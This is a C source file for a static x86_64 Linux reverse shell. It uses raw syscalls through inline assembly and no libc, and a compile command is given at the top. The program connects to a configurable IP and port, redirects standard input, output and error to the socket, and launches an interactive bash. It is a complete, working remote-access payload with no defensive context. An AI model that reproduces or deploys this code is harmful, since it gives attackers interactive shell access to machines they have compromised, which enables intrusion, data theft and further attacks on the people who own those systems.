// gcc -m64 -nostdlib -fno-stack-protector reverse-shell-x86_64-static.c -o reverse-shell

#ifndef IP
 #define IP "127.0.0.1"
#endif

#ifndef PORT
 #define PORT 31337
#endif

#include <asm/unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

// capiroto macro
#define syscall(n, x...) _syscall(__NR_, n, x)
#define _syscall(p, n, x...) _raw_syscall(p##n, x)

// syscall list
#define socket(domain, type, prot) syscall(socket, domain, type, prot)
#define execve(path, argv, envp) syscall(execve, path, argv,envp)
#define connect(fd, addr, len) syscall(connect, fd, addr, len)
#define write(fd, ptr, len) syscall(write, fd, ptr, len)
#define dup2(fd, fd2) syscall(dup2, fd, fd2)
#define exit(n) syscall(exit, n)



__attribute__ ((naked)) long _raw_syscall(unsigned long n, ...){
    asm("mov %rdi, %rax\n"
        "mov %rsi, %rdi\n"
        "mov %rdx, %rsi\n"
        "mov %rcx, %rdx\n"
        "mov %r8, %r10\n"
        "mov %r9, %r8\n"
        "mov 0x8(%rsp), %r9\n"
        "syscall\n"
        "ret\n");
}

int ip2int(const char *str){
    int ret = 0, aux = 0;
    char c;

    while((c = *str++)){
        if(c == '.'){
            ret |= aux;
            ret <<= 8;
            aux = 0;
        } else {
            aux *= 10;
            aux += c-'0';
        }
    }

    return __bswap_32(ret|aux);
}

void _start(void){
    struct sockaddr_in addr;
    const char *argv[]={"bash", "-i", 0L};

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if(fd < 0)
        goto end;


    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = ip2int(IP);
    addr.sin_port = __bswap_16(PORT);

    if(connect(fd, &addr, sizeof(struct sockaddr_in)) < 0)
        goto end;

    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    execve("/bin/bash", argv, 0L);

    end:
    exit(0);
}
